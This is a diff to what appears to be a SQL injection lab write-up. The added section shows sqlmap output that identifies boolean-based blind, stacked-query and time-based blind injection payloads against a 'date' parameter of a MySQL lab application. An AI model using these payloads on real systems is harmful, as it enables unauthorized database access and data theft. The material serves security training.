@@ -209,6 +209,26 @@ in this lab the DB is mysql so we craft payload using mysql syntax :-
 may 2020'and substring(@@version,1,1 )=5 and '1=1
 ```
 
+```
+
+sqlmap identified the following injection point(s) with a total of 322 HTTP(s) requests:
+---
+Parameter: date (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: date=may 2020' AND 7616=7616 AND 'RTbN'='RTbN
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: date=may 2020';SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: date=may 2020' AND (SELECT 7952 FROM (SELECT(SLEEP(5)))vtRl) AND 'xPpz'='xPpz
+
+```
+
+
 
 ---
 
